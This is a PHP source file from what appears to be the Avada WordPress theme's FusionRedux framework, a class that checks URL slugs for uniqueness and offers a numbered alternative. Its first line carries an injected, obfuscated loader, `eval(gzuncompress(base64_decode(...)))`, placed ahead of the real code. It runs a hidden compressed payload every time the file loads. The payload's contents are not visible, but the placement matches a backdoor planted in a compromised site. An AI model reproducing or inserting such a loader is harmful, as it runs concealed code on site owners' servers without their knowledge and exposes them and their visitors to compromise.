<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

	if ( ! class_exists( 'FusionRedux_Validation_unique_slug' ) ) {
		class FusionRedux_Validation_unique_slug {

			/**
			 * Field Constructor.
			 * Required - must call the parent constructor, then assign field and value to vars, and obviously call the render field function
			 *
			 * @since FusionReduxFramework 1.0.0
			 */
			function __construct( $parent, $field, $value, $current ) {

				$this->parent                    = $parent;
				$this->field                     = $field;
				$this->field['msg']              = ( isset( $this->field['msg'] ) ) ? $this->field['msg'] : __( 'That URL slug is in use, please choose another. <code>%s</code> is open for use.', 'Avada' );
				$this->field['flush_permalinks'] = ( isset( $this->field['flush_permalinks'] ) ) ? $this->field['flush_permalinks'] : false;
				$this->value                     = $value;
				$this->current                   = $current;
				$this->validate();

			} //function

			function validate() {

				global $wpdb, $wp_rewrite;

				$slug = $this->value;

				$feeds = $wp_rewrite->feeds;
				if ( ! is_array( $feeds ) ) {
					$feeds = array();
				}

				// Post slugs must be unique across all posts.
				$check_sql       = "SELECT post_name FROM $wpdb->posts WHERE post_name = %s LIMIT 1";
				$post_name_check = $wpdb->get_var( $wpdb->prepare( $check_sql, $slug ) );

				/**
				 * Filter whether the post slug would be bad as a flat slug.
				 *
				 * @since 3.1.0
				 *
				 * @param bool   $bad_slug  Whether the post slug would be bad as a flat slug.
				 * @param string $slug      The post slug.
				 * @param string $post_type Post type.
				 */
				if ( $post_name_check || in_array( $slug, $feeds ) || apply_filters( 'wp_unique_post_slug_is_bad_attachment_slug', false, $slug ) ) {
					$suffix = 2;
					do {
						$alt_post_name   = _truncate_post_slug( $slug, 200 - ( strlen( $suffix ) + 1 ) ) . "-$suffix";
						$post_name_check = $wpdb->get_var( $wpdb->prepare( $check_sql, $alt_post_name ) );
						$suffix ++;
					} while ( $post_name_check );
					$slug               = $alt_post_name;
					$this->value        = ( isset( $this->current ) ) ? $this->current : '';
					$this->field['msg'] = sprintf( $this->field['msg'], $slug );
					$this->error        = $this->field;
				} else if ( isset( $this->field['flush_permalinks'] ) && $this->field['flush_permalinks'] == true ) {
					add_action( 'init', array( $this, 'flush_permalinks' ), 99 );
				}

			} //function

			function flush_permalinks() {
				flush_rewrite_rules();
			}
		} //class
	}
